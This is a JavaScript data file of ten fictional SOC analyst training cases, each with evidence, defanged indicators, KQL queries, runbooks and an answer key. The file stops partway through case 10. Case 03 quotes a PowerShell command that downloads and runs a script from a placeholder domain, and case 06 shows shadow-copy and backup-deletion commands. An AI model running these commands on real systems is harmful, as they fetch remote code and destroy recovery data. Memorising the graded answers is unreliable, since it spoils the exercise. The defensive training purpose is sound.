/* SOC L1 Case Lab — cases 1 to 10.
   All people, hosts, domains and IPs are fictional. Domains use the reserved
   .example TLD and IPs use documentation ranges (192.0.2.0/24, 198.51.100.0/24,
   203.0.113.0/24). IOCs are defanged: hxxp, [.] and [:]. */
window.CASES = window.CASES || [];
window.CASES.push(

/* ------------------------------------------------------------------ 01 */
{
  id: "INC-2401", title: "Reported phishing email", category: "Email", subcategory: "Phishing",
  priority: "Medium", source: "Defender for Office 365", entity: "Maya Chen · Finance", opened: "2026-10-05 09:14 UTC",
  summary: "User reported an unexpected 'Microsoft 365 password expiry' email. She says she did not enter her password.",
  evidence: [
    { tab: "Alert", body:
`AlertName      : Email reported by user as malware or phish
Severity       : Medium
NetworkMessageId: 7c1f0e2a-91d4-4b8e-a0f1-2d9b5e7c3a10
Recipient      : maya.chen@harbourline.example
ReportedAt     : 2026-10-05T09:12:47Z` },
    { tab: "Headers", body:
`From:            "Microsoft 365 Security" <no-reply@m365-security-alerts.example>
Return-Path:     <bounce@mailer-7731.example>
Subject:         Action required: your password expires today
Received:        from mailer-7731.example (198.51.100.23)
Authentication-Results: spf=fail smtp.mailfrom=mailer-7731.example;
                 dkim=none; dmarc=fail action=none header.from=m365-security-alerts.example
X-MS-Exchange-Organization-SCL: 5
Body link:       hxxps://login-microsoftonline-security[.]example/auth?u=maya.chen` },
    { tab: "User interview", body:
`09:20  Analyst call with Maya Chen
- Opened the message on her laptop, hovered over the button, did NOT click.
- Did not reply, open attachments or enter credentials.
- No unexpected MFA prompts on her phone today.` },
    { tab: "Telemetry", body:
`UrlClickEvents  (last 24h, Url has "login-microsoftonline-security")  -> 0 rows
SigninLogs      (maya.chen, last 24h)  -> 4 rows, all Dublin office IP 192.0.2.10, compliant device
EmailEvents     (same sender, last 7d) -> 3 recipients: maya.chen, ops.lead, ap.clerk  (all Delivered)` }
  ],
  iocs: [
    { type: "Sender", value: "no-reply@m365-security-alerts[.]example" },
    { type: "Domain", value: "login-microsoftonline-security[.]example" },
    { type: "URL", value: "hxxps://login-microsoftonline-security[.]example/auth" },
    { type: "IP", value: "198.51.100[.]23", note: "Sending server" }
  ],
  mitre: [{ id: "T1566.002", name: "Phishing: Spearphishing Link", tactic: "Initial Access" }],
  kql: `// Find every copy of the campaign and any clicks
EmailEvents
| where Timestamp > ago(7d)
| where SenderFromDomain == "m365-security-alerts.example"
    or SenderIPv4 == "198.51.100.23"
| project Timestamp, RecipientEmailAddress, Subject, DeliveryAction, NetworkMessageId
| join kind=leftouter (
    UrlClickEvents
    | where Url has "login-microsoftonline-security.example"
    | project NetworkMessageId, ClickTime = Timestamp, ActionType
  ) on NetworkMessageId`,
  runbook: [
    "Check sender, SPF/DKIM/DMARC results, the link and how many people received it.",
    "Confirm with the user: did they click, enter a password, open an attachment or approve an MFA prompt?",
    "If there was no interaction and no sign of account compromise: quarantine all copies, block the sender and URL, tell the user, close.",
    "Escalate if anyone clicked, entered credentials, ran a file, approved MFA, or if the campaign is wide."
  ],
  kb: { id: "SOC-EMAIL-001", title: "User-reported phishing triage" },
  refs: [
    { label: "Microsoft — Phishing investigation playbook", url: "https://learn.microsoft.com/en-us/security/operations/incident-response-playbook-phishing" },
    { label: "MITRE ATT&CK T1566.002", url: "https://attack.mitre.org/techniques/T1566/002/" }
  ],
  checklist: [
    "Reviewed SPF, DKIM and DMARC results",
    "Identified and defanged the phishing URL",
    "Found all recipients of the campaign",
    "Checked for URL clicks",
    "Checked the user's recent sign-ins",
    "Quarantined messages and blocked sender/URL"
  ],
  answer: "resolve", classification: "True positive",
  rationale: "The email is malicious, but nobody clicked, no credentials were entered, and sign-ins are clean. Quarantine and blocking are inside the L1 runbook, so L1 can close it.",
  model: {
    short: "Reported phishing email — no user interaction — contained",
    investigation: "SPF fail, DKIM none, DMARC fail; display name impersonates Microsoft. Link points to a look-alike login page. 3 recipients found; UrlClickEvents shows 0 clicks. User confirms no click, no credentials, no MFA approval. Sign-ins for the last 24h are from the Dublin office on a compliant device.",
    actions: "Soft-deleted/quarantined all 3 copies. Blocked sender domain, sending IP and URL in Tenant Allow/Block List. Thanked the user and sent a short 'how to spot this' note to the 3 recipients.",
    next: "Closed at L1. Reopen if any new click or sign-in alert appears for these recipients."
  }
},

/* ------------------------------------------------------------------ 02 */
{
  id: "INC-2402", title: "Impossible travel sign-in", category: "Identity", subcategory: "Risky sign-in",
  priority: "Medium", source: "Microsoft Entra ID Protection", entity: "Liam Byrne · Sales", opened: "2026-10-05 10:02 UTC",
  summary: "Atypical travel risk: sign-ins from Dublin and Frankfurt 40 minutes apart. Both passed MFA.",
  evidence: [
    { tab: "Alert", body:
`RiskEventType : unlikelyTravel
RiskLevel     : medium
User          : liam.byrne@harbourline.example
Sign-in A     : 2026-10-05T09:11Z  Dublin, IE     192.0.2.10     Outlook desktop
Sign-in B     : 2026-10-05T09:51Z  Frankfurt, DE  203.0.113.80   Teams desktop` },
    { tab: "Sign-in logs", body:
`Time       IP             Location   App      MFA      Device         Compliant
09:11:03   192.0.2.10     Dublin     Outlook  Passed   LT-SALES-022   Yes
09:51:40   203.0.113.80   Frankfurt  Teams    Passed   LT-SALES-022   Yes
09:52:10   203.0.113.80   Frankfurt  SharePoint Passed LT-SALES-022   Yes` },
    { tab: "IP lookup", body:
`203.0.113.80  -> ASN 64500 "Harbourline Corporate VPN — FRA-01 egress"
Listed in Named Locations: "Corporate VPN egress" (trusted)` },
    { tab: "User interview", body:
`Liam is in the Dublin office. He connected to the corporate VPN at ~09:50
because the CRM only works over VPN. He did not share his password.` }
  ],
  iocs: [{ type: "IP", value: "203.0.113[.]80", note: "Corporate VPN egress — benign" }],
  mitre: [{ id: "T1078.004", name: "Valid Accounts: Cloud Accounts", tactic: "Initial Access" }],
  kql: `// Compare devices and IPs for the user over 7 days
SigninLogs
| where TimeGenerated > ago(7d)
| where UserPrincipalName == "liam.byrne@harbourline.example"
| summarize Count = count(), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated)
    by IPAddress, Location = tostring(LocationDetails.city),
       DeviceId = tostring(DeviceDetail.deviceId), AppDisplayName
| order by LastSeen desc`,
  runbook: [
    "Compare both sign-ins: same device? MFA passed? Compliant device?",
    "Look up the 'far away' IP — is it a known VPN, proxy or cloud egress?",
    "Confirm with the user if needed.",
    "If explained by corporate VPN on the same managed device, mark as benign and dismiss the risk.",
    "Escalate if the device is unknown, MFA was skipped, or the IP is unfamiliar."
  ],
  kb: { id: "SOC-ID-004", title: "Atypical travel / impossible travel triage" },
  refs: [
    { label: "Microsoft Entra — Investigate risk", url: "https://learn.microsoft.com/en-us/entra/id-protection/howto-identity-protection-investigate-risk" },
    { label: "MITRE ATT&CK T1078.004", url: "https://attack.mitre.org/techniques/T1078/004/" }
  ],
  checklist: [
    "Compared device ID on both sign-ins",
    "Confirmed MFA result",
    "Identified the IP as corporate VPN",
    "Confirmed with the user",
    "Dismissed user risk with a note"
  ],
  answer: "resolve", classification: "Benign true positive",
  rationale: "The detection worked as designed, but the 'travel' is the corporate VPN on the same compliant laptop with MFA. Nothing to escalate.",
  model: {
    short: "Impossible travel — corporate VPN egress — benign",
    investigation: "Both sign-ins from device LT-SALES-022 (compliant) with MFA passed. 203.0.113.80 is the Harbourline VPN Frankfurt egress and is a trusted named location. User confirms VPN use at 09:50.",
    actions: "Dismissed user risk in Entra ID Protection with comment. Suggested to the identity team that the VPN egress be excluded from travel detections.",
    next: "Closed at L1 as benign true positive."
  }
},

/* ------------------------------------------------------------------ 03 */
{
  id: "INC-2403", title: "Malware blocked, then PowerShell beacon", category: "Endpoint", subcategory: "Malware",
  priority: "High", source: "Defender for Endpoint", entity: "WKSTN-447 · Elena Rossi", opened: "2026-10-05 11:21 UTC",
  summary: "AV blocked a trojan, but a hidden PowerShell child process ran and made an outbound connection afterwards.",
  evidence: [
    { tab: "Alert", body:
`11:18:02  Trojan:Win32/AgentTesla.RV!MTB  — Blocked  — C:\\Users\\erossi\\Downloads\\Invoice_7731.exe
11:19:40  Suspicious PowerShell command line   — Detected (not blocked)` },
    { tab: "Process tree", body:
`explorer.exe (4120)
 └─ Invoice_7731.exe (6604)            [blocked at 11:18:02 — but ran for 1.4s]
     └─ powershell.exe (7012)  -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi...
         └─ conhost.exe (7020)` },
    { tab: "Decoded command", body:
`IEX (New-Object Net.WebClient).DownloadString('hxxp://update-cdn-sync[.]example/a.ps1')` },
    { tab: "Network", body:
`11:19:41  powershell.exe  -> 203.0.113.45:80   update-cdn-sync.example   ConnectionSuccess  (14.2 KB received)
11:24:41  powershell.exe  -> 203.0.113.45:80   ConnectionSuccess
11:29:41  powershell.exe  -> 203.0.113.45:80   ConnectionSuccess   (every 5 min = beaconing)` }
  ],
  iocs: [
    { type: "File", value: "Invoice_7731.exe" },
    { type: "SHA256", value: "4f2a9c1e0b7d5a3e8c6f1b2d9e0a7c4b5f3e1d2c8a9b0e7f6d5c4b3a2918f0e1", note: "Fictional hash" },
    { type: "Domain", value: "update-cdn-sync[.]example" },
    { type: "URL", value: "hxxp://update-cdn-sync[.]example/a.ps1" },
    { type: "IP", value: "203.0.113[.]45" }
  ],
  mitre: [
    { id: "T1204.002", name: "User Execution: Malicious File", tactic: "Execution" },
    { id: "T1059.001", name: "Command and Scripting Interpreter: PowerShell", tactic: "Execution" },
    { id: "T1027", name: "Obfuscated Files or Information", tactic: "Defense Evasion" },
    { id: "T1071.001", name: "Application Layer Protocol: Web Protocols", tactic: "Command and Control" }
  ],
  kql: `// Encoded PowerShell and its network activity on the host
DeviceProcessEvents
| where DeviceName == "wkstn-447" and Timestamp > ago(1d)
| where FileName =~ "powershell.exe" and ProcessCommandLine has_any ("-enc", "-EncodedCommand")
| project Timestamp, ProcessId, InitiatingProcessFileName, ProcessCommandLine
| join kind=inner (
    DeviceNetworkEvents
    | where DeviceName == "wkstn-447" and Timestamp > ago(1d)
    | project InitiatingProcessId, RemoteIP, RemoteUrl, RemotePort, NetTime = Timestamp
  ) on $left.ProcessId == $right.InitiatingProcessId`,
  runbook: [
    "Check whether the blocked file had any child processes or network activity.",
    "Decode any encoded command lines.",
    "If a child process ran or there is outbound traffic after the block, treat it as active compromise.",
    "Isolate the device (if permitted for L1), collect the investigation package, and escalate to L2/IR."
  ],
  kb: { id: "SOC-EDR-002", title: "Blocked malware with post-block activity" },
  refs: [
    { label: "MITRE ATT&CK T1059.001", url: "https://attack.mitre.org/techniques/T1059/001/" },
    { label: "Microsoft — Take response actions on a device", url: "https://learn.microsoft.com/en-us/defender-endpoint/respond-machine-alerts" }
  ],
  checklist: [
    "Reviewed the process tree",
    "Decoded the Base64 PowerShell",
    "Found the 5-minute beacon pattern",
    "Isolated the device",
    "Collected IOCs for blocking",
    "Escalated to L2 / Incident Response"
  ],
  answer: "escalate", classification: "True positive",
  rationale: "The 'blocked' file ran long enough to start PowerShell, download a script and beacon every 5 minutes. That is an active compromise — beyond L1.",
  model: {
    short: "Malware block bypassed — PowerShell C2 beacon — escalated",
    investigation: "Invoice_7731.exe ran 1.4 s before the block and spawned hidden encoded PowerShell. Decoded: IEX download cradle from update-cdn-sync.example/a.ps1. Network shows connections to 203.0.113.45 every 5 minutes since 11:19 (beaconing).",
    actions: "Isolated WKSTN-447 via Defender. Collected investigation package. Submitted IOCs (domain, IP, hash) for blocking. User told not to use the device.",
    next: "Escalated to L2/IR as P2: possible AgentTesla info-stealer — credential reset for erossi likely required."
  }
},

/* ------------------------------------------------------------------ 04 */
{
  id: "INC-2404", title: "Password spray with one success", category: "Identity", subcategory: "Password spray",
  priority: "High", source: "Microsoft Sentinel", entity: "18 user accounts", opened: "2026-10-05 12:07 UTC",
  summary: "One external IP failed logins against 18 accounts, then one sign-in succeeded over a legacy protocol (no MFA).",
  evidence: [
    { tab: "Alert", body:
`Analytic rule : Password spray — many accounts, one source IP
Source IP     : 198.51.100.77  (hosting provider, no prior history)
Window        : 11:40–12:05 UTC
Failures      : 54 (error 50126 — invalid username or password) across 18 users
Success       : 1` },
    { tab: "Sign-in logs", body:
`12:03:18  j.walsh@harbourline.example  198.51.100.77  Client: Authenticated SMTP  Result: Success  MFA: Not applied (legacy auth)
12:03:19  r.kelly@harbourline.example  198.51.100.77  Client: Authenticated SMTP  Result: 50126
12:03:21  s.obrien@harbourline.example 198.51.100.77  Client: Authenticated SMTP  Result: 50126` },
    { tab: "Mailbox", body:
`12:06:02  j.walsh  Send — 212 outbound messages in 3 minutes (external recipients)` }
  ],
  iocs: [
    { type: "IP", value: "198.51.100[.]77" },
    { type: "Account", value: "j.walsh@harbourline[.]example", note: "Compromised" }
  ],
  mitre: [
    { id: "T1110.003", name: "Brute Force: Password Spraying", tactic: "Credential Access" },
    { id: "T1078.004", name: "Valid Accounts: Cloud Accounts", tactic: "Initial Access" }
  ],
  kql: `// Spray pattern: one IP, many users, few attempts each
SigninLogs
| where TimeGenerated > ago(1d)
| where IPAddress == "198.51.100.77"
| summarize Attempts = count(),
            Users = dcount(UserPrincipalName),
            Successes = countif(ResultType == "0"),
            Apps = make_set(ClientAppUsed)
    by IPAddress`,
  runbook: [
    "Confirm the spray pattern (one IP, many users, low attempts per user).",
    "Check for any successful sign-in from that IP.",
    "No success: block the IP and close.",
    "Any success: treat the account as compromised — disable/revoke sessions per policy and escalate."
  ],
  kb: { id: "SOC-ID-007", title: "Password spray response" },
  refs: [
    { label: "Microsoft — Password spray investigation playbook", url: "https://learn.microsoft.com/en-us/security/operations/incident-response-playbook-password-spray" },
    { label: "MITRE ATT&CK T1110.003", url: "https://attack.mitre.org/techniques/T1110/003/" }
  ],
  checklist: [
    "Confirmed one IP against many users",
    "Found the successful legacy-auth sign-in",
    "Checked post-login activity (outbound mail)",
    "Revoked sessions / disabled the account",
    "Blocked the source IP",
    "Escalated to L2"
  ],
  answer: "escalate", classification: "True positive",
  rationale: "A spray with a successful sign-in, no MFA and 212 outbound emails is a compromised account sending spam/phishing. Needs L2 and identity team.",
  model: {
    short: "Password spray — j.walsh compromised via legacy SMTP auth — escalated",
    investigation: "198.51.100.77 attempted 18 accounts (54 failures). j.walsh succeeded at 12:03 via Authenticated SMTP — legacy auth bypassed MFA. Account sent 212 external emails within 3 minutes.",
    actions: "Revoked sessions and disabled j.walsh per runbook. Blocked 198.51.100.77. Raised request to disable SMTP AUTH for the tenant.",
    next: "Escalated to L2: password reset, mailbox rules review, outbound spam clean-up, legacy auth policy."
  }
},

/* ------------------------------------------------------------------ 05 */
{
  id: "INC-2405", title: "USB write blocked by policy", category: "DLP", subcategory: "Removable media",
  priority: "Low", source: "Endpoint DLP", entity: "Nora Patel · Design", opened: "2026-10-05 14:38 UTC",
  summary: "Endpoint control blocked a copy to an unapproved USB stick. No data left the device.",
  evidence: [
    { tab: "Alert", body:
`Policy        : Block write to unapproved removable storage
Action        : Blocked
Device        : LT-DES-014
File          : Brand_Guidelines_v4.pdf  (Classification: Internal)
USB           : SanDisk Ultra  VID_0781 PID_5581  Serial 4C53...  (not on approved list)` },
    { tab: "Device events", body:
`14:37:55  UsbDriveMounted        E:\\
14:38:02  RemovableStorageFileEvent  Write  Blocked  Brand_Guidelines_v4.pdf
14:38:10  No further write attempts` },
    { tab: "User interview", body:
`Nora wanted to bring the brand guide to a printer shop. She did not know USB was blocked.
Manager confirms the file is Internal (not Confidential) and the request was legitimate.` }
  ],
  iocs: [],
  mitre: [{ id: "T1052.001", name: "Exfiltration Over Physical Medium: USB", tactic: "Exfiltration" }],
  kql: `DeviceEvents
| where DeviceName == "lt-des-014" and Timestamp > ago(1d)
| where ActionType in ("UsbDriveMounted", "RemovableStoragePolicyTriggered", "RemovableStorageFileEvent")
| project Timestamp, ActionType, AdditionalFields`,
  runbook: [
    "Confirm the action was Blocked and no file was written.",
    "Check file classification and any repeat attempts.",
    "Speak to the user/manager to confirm the business reason.",
    "If blocked, low sensitivity and explained: educate the user, point to the approved sharing method, close.",
    "Escalate if data was copied, files are Confidential, or there are repeated attempts."
  ],
  kb: { id: "SOC-DLP-001", title: "Removable media policy events" },
  refs: [{ label: "MITRE ATT&CK T1052.001", url: "https://attack.mitre.org/techniques/T1052/001/" }],
  checklist: [
    "Confirmed the write was blocked",
    "Checked file classification",
    "Checked for repeat attempts",
    "Confirmed business reason with manager",
    "Explained the approved sharing method to the user"
  ],
  answer: "resolve", classification: "Benign true positive",
  rationale: "The control worked, nothing was copied, the file is Internal and the reason is legitimate. User education is enough.",
  model: {
    short: "USB write blocked — Internal file — user educated",
    investigation: "Single write attempt of Brand_Guidelines_v4.pdf (Internal) to an unapproved SanDisk USB; action Blocked, no further attempts. Manager confirms legitimate reason.",
    actions: "Explained policy to user; shared the approved method (OneDrive share link with expiry).",
    next: "Closed at L1."
  }
},

/* ------------------------------------------------------------------ 06 */
{
  id: "INC-2406", title: "Ransomware behaviour on laptop", category: "Endpoint", subcategory: "Ransomware",
  priority: "Critical", source: "EDR + file server alerts", entity: "ENG-LT-091 · Kai Morgan", opened: "2026-10-05 15:02 UTC",
  summary: "Mass file renames to .lockd and shadow-copy deletion seen from one engineering laptop, including on a mapped share.",
  evidence: [
    { tab: "Alert", body:
`15:00:11  Ransomware behaviour detected   Severity: High
15:00:14  Shadow copy deletion            Severity: High
15:01:30  File server: 1,840 files renamed in 90s on \\\\fs01\\engineering by HARBOURLINE\\kmorgan` },
    { tab: "Process tree", body:
`winword.exe
 └─ cmd.exe /c %TEMP%\\svc_upd.exe
     └─ svc_upd.exe
         ├─ vssadmin.exe delete shadows /all /quiet
         ├─ wbadmin.exe delete catalog -quiet
         └─ (writes README_RESTORE.txt in every folder)` },
    { tab: "File events", body:
`15:00:20  C:\\Users\\kmorgan\\Documents\\design_spec.docx -> design_spec.docx.lockd
15:00:20  C:\\Users\\kmorgan\\Documents\\BOM_rev3.xlsx   -> BOM_rev3.xlsx.lockd
15:01:02  \\\\fs01\\engineering\\Projects\\P-118\\drawing.dwg -> drawing.dwg.lockd
... 1,840 more` },
    { tab: "Ransom note", body:
`README_RESTORE.txt
"Your files are encrypted. Contact us on hxxp://lockd-support[.]example ..."` }
  ],
  iocs: [
    { type: "File", value: "svc_upd.exe" },
    { type: "Extension", value: ".lockd" },
    { type: "URL", value: "hxxp://lockd-support[.]example" }
  ],
  mitre: [
    { id: "T1486", name: "Data Encrypted for Impact", tactic: "Impact" },
    { id: "T1490", name: "Inhibit System Recovery", tactic: "Impact" },
    { id: "T1204.002", name: "User Execution: Malicious File", tactic: "Execution" }
  ],
  kql: `// Mass renames from one host in a short window
DeviceFileEvents
| where Timestamp > ago(2h)
| where ActionType == "FileRenamed" and FileName endswith ".lockd"
| summarize Files = count(), First = min(Timestamp), Last = max(Timestamp) by DeviceName, InitiatingProcessFileName
| order by Files desc`,
  runbook: [
    "Do NOT try to clean up. Contain first.",
    "Isolate the device immediately and disconnect the user's sessions to file shares.",
    "Raise a Critical incident and call the on-call IR lead — do not wait for the queue.",
    "Preserve evidence (do not reboot, do not delete the note)."
  ],
  kb: { id: "SOC-IR-001", title: "Suspected ransomware — first 15 minutes" },
  refs: [
    { label: "CISA #StopRansomware Guide", url: "https://www.cisa.gov/stopransomware/ransomware-guide" },
    { label: "MITRE ATT&CK T1486", url: "https://attack.mitre.org/techniques/T1486/" }
  ],
  checklist: [
    "Isolated the device",
    "Blocked the user's access to file shares",
    "Identified affected share and file count",
    "Identified the initial process (Word → svc_upd.exe)",
    "Preserved evidence (no reboot)",
    "Escalated as Critical to IR on-call"
  ],
  answer: "escalate", classification: "True positive",
  rationale: "Active encryption plus backup deletion on a shared drive is a Critical incident. L1 contains and escalates straight away.",
  model: {
    short: "Active ransomware on ENG-LT-091 — share affected — Critical escalation",
    investigation: "Word spawned cmd → svc_upd.exe, which deleted shadow copies and the backup catalog, then renamed ~1,840 files to .lockd locally and on \\\\fs01\\engineering. Ransom note dropped.",
    actions: "Isolated ENG-LT-091. Disabled kmorgan's sessions and SMB access to fs01. Called IR on-call at 15:04. No reboot; evidence preserved.",
    next: "Escalated as Critical (P1) to IR; file-server team to check snapshots for restore."
  }
},

/* ------------------------------------------------------------------ 07 */
{
  id: "INC-2407", title: "MFA fatigue — user approved prompt", category: "Identity", subcategory: "MFA fatigue",
  priority: "High", source: "Microsoft Sentinel", entity: "Aoife Murphy · HR", opened: "2026-10-06 07:48 UTC",
  summary: "User received 23 MFA push prompts in 10 minutes late at night and approved the last one.",
  evidence: [
    { tab: "Alert", body:
`Analytic rule : Multiple MFA denials followed by approval
User          : aoife.murphy@harbourline.example
Window        : 2026-10-06 01:12–01:22 UTC
Denied/ignored: 22   Approved: 1 (01:22:05)
Source IP     : 203.0.113.150 (residential proxy, Romania)` },
    { tab: "Sign-in logs", body:
`01:22:05  203.0.113.150  Office 365 Exchange Online  Success  MFA: Approved (push)  Device: unregistered  Browser: Chrome/Linux
01:23:40  203.0.113.150  Microsoft Authenticator — Register security info   Success` },
    { tab: "Audit logs", body:
`01:23:41  User registered new authentication method: Authenticator app "Pixel 7"
01:25:10  New inbox rule created: Name "." — Move messages containing "payroll" to RSS Feeds` },
    { tab: "User interview", body:
`Aoife says her phone kept buzzing in the night and she pressed Approve "to make it stop".
She does not own a Pixel 7.` }
  ],
  iocs: [
    { type: "IP", value: "203.0.113[.]150" },
    { type: "MFA device", value: "Authenticator 'Pixel 7' (attacker)" }
  ],
  mitre: [
    { id: "T1621", name: "Multi-Factor Authentication Request Generation", tactic: "Credential Access" },
    { id: "T1098.005", name: "Account Manipulation: Device Registration", tactic: "Persistence" },
    { id: "T1564.008", name: "Hide Artifacts: Email Hiding Rules", tactic: "Defense Evasion" }
  ],
  kql: `// Users with many MFA denials then a success
SigninLogs
| where TimeGenerated > ago(1d)
| where AuthenticationRequirement == "multiFactorAuthentication"
| summarize Denied = countif(ResultType in ("500121", "50074")),
            Success = countif(ResultType == "0"),
            IPs = make_set(IPAddress)
    by UserPrincipalName, bin(TimeGenerated, 15m)
| where Denied >= 5 and Success >= 1`,
  runbook: [
    "Check MFA logs for many denials followed by an approval.",
    "Check for new MFA methods, inbox rules or mailbox access after the approval.",
    "Revoke sessions, remove the rogue MFA method, disable the account per policy.",
    "Escalate — the attacker had a valid session."
  ],
  kb: { id: "SOC-ID-009", title: "MFA fatigue / push bombing" },
  refs: [
    { label: "MITRE ATT&CK T1621", url: "https://attack.mitre.org/techniques/T1621/" },
    { label: "Microsoft — How number matching works in MFA push", url: "https://learn.microsoft.com/en-us/entra/identity/authentication/how-to-mfa-number-match" }
  ],
  checklist: [
    "Counted MFA denials before the approval",
    "Found the new MFA device registration",
    "Found the hidden inbox rule",
    "Revoked sessions and removed the rogue MFA method",
    "Escalated to L2"
  ],
  answer: "escalate", classification: "True positive",
  rationale: "The attacker got in, registered their own MFA device and hid payroll emails. That is a compromised account with persistence.",
  model: {
    short: "MFA fatigue — account compromised, attacker MFA added — escalated",
    investigation: "22 prompts denied/ignored then approved at 01:22 from residential proxy 203.0.113.150. Attacker registered 'Pixel 7' Authenticator and created a hidden '.' rule moving 'payroll' mail to RSS Feeds. User confirms she approved to stop the prompts.",
    actions: "Revoked all sessions, removed the rogue Authenticator method, disabled the account pending reset, removed the inbox rule (exported first as evidence).",
    next: "Escalated to L2: check for payroll/BEC fraud, review mailbox access, recommend number matching."
  }
},

/* ------------------------------------------------------------------ 08 */
{
  id: "INC-2408", title: "External mail forwarding rule", category: "Email", subcategory: "Business email compromise",
  priority: "High", source: "Defender for Cloud Apps", entity: "Declan Shaw · Finance Director", opened: "2026-10-06 09:30 UTC",
  summary: "A new inbox rule forwards every email with 'invoice' or 'bank' to a free webmail address.",
  evidence: [
    { tab: "Alert", body:
`Policy : Suspicious inbox forwarding
User   : declan.shaw@harbourline.example
Rule   : "Sync" — If subject/body contains "invoice" OR "bank" OR "payment"
         -> Forward to accounts.dshaw@freemail-box.example
         -> Mark as read, Move to Archive` },
    { tab: "Audit logs", body:
`Operation : New-InboxRule
ClientIP  : 198.51.100.200
UserAgent : python-requests/2.31
Time      : 2026-10-06 03:14 UTC` },
    { tab: "Sign-in logs", body:
`03:10  198.51.100.200  Success  MFA: satisfied by token  (session from 2026-10-04 AiTM phishing page?)
Normal pattern for this user: Dublin office 192.0.2.10 and home ISP only` }
  ],
  iocs: [
    { type: "Email", value: "accounts.dshaw@freemail-box[.]example" },
    { type: "IP", value: "198.51.100[.]200" }
  ],
  mitre: [
    { id: "T1114.003", name: "Email Collection: Email Forwarding Rule", tactic: "Collection" },
    { id: "T1564.008", name: "Hide Artifacts: Email Hiding Rules", tactic: "Defense Evasion" },
    { id: "T1550.004", name: "Use Alternate Authentication Material: Web Session Cookie", tactic: "Defense Evasion" }
  ],
  kql: `OfficeActivity
| where TimeGenerated > ago(7d)
| where Operation in ("New-InboxRule", "Set-InboxRule", "UpdateInboxRules")
| extend Params = tostring(Parameters)
| where Params has_any ("ForwardTo", "RedirectTo", "ForwardAsAttachmentTo")
| project TimeGenerated, UserId, ClientIP, Params`,
  runbook: [
    "Check who created the rule, from where, and with what client.",
    "Forwarding to an external personal address from an unknown IP = treat as BEC.",
    "Disable the rule (export first), revoke sessions, block the external address.",
    "Escalate — finance mailbox, possible payment fraud."
  ],
  kb: { id: "SOC-EMAIL-005", title: "Business email compromise — first response" },
  refs: [
    { label: "MITRE ATT&CK T1114.003", url: "https://attack.mitre.org/techniques/T1114/003/" },
    { label: "Microsoft — Compromised email account response", url: "https://learn.microsoft.com/en-us/defender-office-365/responding-to-a-compromised-email-account" }
  ],
  checklist: [
    "Identified the rule conditions and destination",
    "Checked rule creator IP and user agent",
    "Compared with the user's normal sign-in pattern",
    "Exported then disabled the rule",
    "Revoked sessions",
    "Escalated to L2 and warned Finance"
  ],
  answer: "escalate", classification: "True positive",
  rationale: "A script from an unknown IP created a hidden external forward on the Finance Director's mailbox. Classic BEC — high fraud risk.",
  model: {
    short: "BEC — external forwarding rule on Finance Director mailbox — escalated",
    investigation: "Rule 'Sync' forwards invoice/bank/payment mail to freemail-box.example and archives it. Created at 03:14 from 198.51.100.200 with python-requests — not the user's normal locations. Sign-in used an existing token (likely stolen session cookie).",
    actions: "Exported and disabled rule, revoked sessions, blocked external address and IP. Asked Finance to hold any bank-detail changes received since 2026-10-04.",
    next: "Escalated to L2: scope what was forwarded, check for AiTM phishing on 04 Oct, notify Finance and legal if payments affected."
  }
},

/* ------------------------------------------------------------------ 09 */
{
  id: "INC-2409", title: "Suspicious OAuth app consent", category: "Identity", subcategory: "Illicit consent",
  priority: "High", source: "Microsoft Entra audit logs", entity: "Tomás Reilly · Marketing", opened: "2026-10-06 11:05 UTC",
  summary: "User granted a new third-party app full access to mail and files after clicking a 'shared document' link.",
  evidence: [
    { tab: "Alert", body:
`Activity  : Consent to application
App name  : "DocuView Secure Share"
Publisher : Unverified
AppId     : 9b1e2f44-0c7a-4d1e-8f2b-55a0c3d9e111
Permissions (delegated): Mail.Read, Mail.Send, Files.ReadWrite.All, offline_access` },
    { tab: "App activity", body:
`11:02  App read 1,204 messages from tomas.reilly mailbox
11:03  App downloaded 86 files from OneDrive
11:04  App sent 40 emails "Tomás shared a document with you" to external contacts
Reply URL: hxxps://docuview-share[.]example/callback` },
    { tab: "User interview", body:
`Tomás clicked 'Open document' in an email from a known supplier and clicked 'Accept' on the permissions page.` }
  ],
  iocs: [
    { type: "App ID", value: "9b1e2f44-0c7a-4d1e-8f2b-55a0c3d9e111" },
    { type: "URL", value: "hxxps://docuview-share[.]example/callback" }
  ],
  mitre: [
    { id: "T1528", name: "Steal Application Access Token", tactic: "Credential Access" },
    { id: "T1566.002", name: "Phishing: Spearphishing Link", tactic: "Initial Access" }
  ],
  kql: `AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName == "Consent to application"
| extend App = tostring(TargetResources[0].displayName),
         User = tostring(InitiatedBy.user.userPrincipalName)
| project TimeGenerated, User, App, Result`,
  runbook: [
    "Review the app: publisher verified? Permissions requested? Reply URL?",
    "Check what the app has already done with its access.",
    "Revoke the consent and disable the app's service principal per policy.",
    "Escalate if the app read or sent data."
  ],
  kb: { id: "SOC-ID-011", title: "Illicit consent grant" },
  refs: [
    { label: "Microsoft — App consent grant investigation", url: "https://learn.microsoft.com/en-us/security/operations/incident-response-playbook-app-consent" },
    { label: "MITRE ATT&CK T1528", url: "https://attack.mitre.org/techniques/T1528/" }
  ],
  checklist: [
    "Checked publisher verification",
    "Listed the high-risk permissions",
    "Reviewed app activity (reads, downloads, sends)",
    "Revoked consent / disabled service principal",
    "Escalated to L2"
  ],
  answer: "escalate", classification: "True positive",
  rationale: "An unverified app with mail and file permissions already took data and spread the lure. Password reset alone does not stop OAuth tokens.",
  model: {
    short: "Illicit OAuth consent — data accessed, lure sent — escalated",
    investigation: "Unverified app 'DocuView Secure Share' granted Mail.Read, Mail.Send, Files.ReadWrite.All, offline_access. Read 1,204 messages, downloaded 86 files, sent 40 lures to external contacts.",
    actions: "Revoked OAuth grants, disabled the service principal, blocked reply URL domain. Recommended admin-consent workflow.",
    next: "Escalated to L2: data-exposure assessment and contact affected external recipients."
  }
},

/* ------------------------------------------------------------------ 10 */
{
  id: "INC-2410", title: "Tor sign-in attempt blocked", category: "Identity", subcategory: "Anonymous IP",
  priority: "Low", source: "Microsoft Entra ID Protection", entity: "Sean Doyle · Warehouse", opened: "2026-10-06 13:20 UTC",
  summary: "Sign-in attempt from a Tor exit node. Conditional Access blocked it; the password was wrong anyway.",
  evidence: [
    { tab: "Alert", body:
`RiskEventType : anonymizedIPAddress
RiskLevel     : low
User          : sean.doyle@harbourline.example
IP            : 192.0.2.250 (Tor exit node)` },
    { tab: "Sign-in logs", body:
